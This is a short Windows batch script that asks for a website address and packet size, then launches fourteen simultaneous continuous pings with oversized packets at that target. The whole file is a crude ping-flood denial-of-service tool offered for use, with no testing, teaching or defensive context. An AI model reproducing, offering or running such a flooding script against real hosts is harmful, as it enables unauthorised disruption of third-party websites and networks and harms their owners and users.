@echo off
color 04
echo Enter Website address:
set /p target=
echo Enter Packet size(0-65500)
set /p size=
color 02
start cmd.exe /c ping %target% -l %size% -t
start cmd.exe /c ping %target% -l %size% -t
start cmd.exe /c ping %target% -l %size% -t
start cmd.exe /c ping %target% -l %size% -t
start cmd.exe /c ping %target% -l %size% -t
start cmd.exe /c ping %target% -l %size% -t
start cmd.exe /c ping %target% -l %size% -t
start cmd.exe /c ping %target% -l %size% -t
start cmd.exe /c ping %target% -l %size% -t
start cmd.exe /c ping %target% -l %size% -t
start cmd.exe /c ping %target% -l %size% -t
start cmd.exe /c ping %target% -l %size% -t
start cmd.exe /c ping %target% -l %size% -t
ping %target% -l %size% -t

pause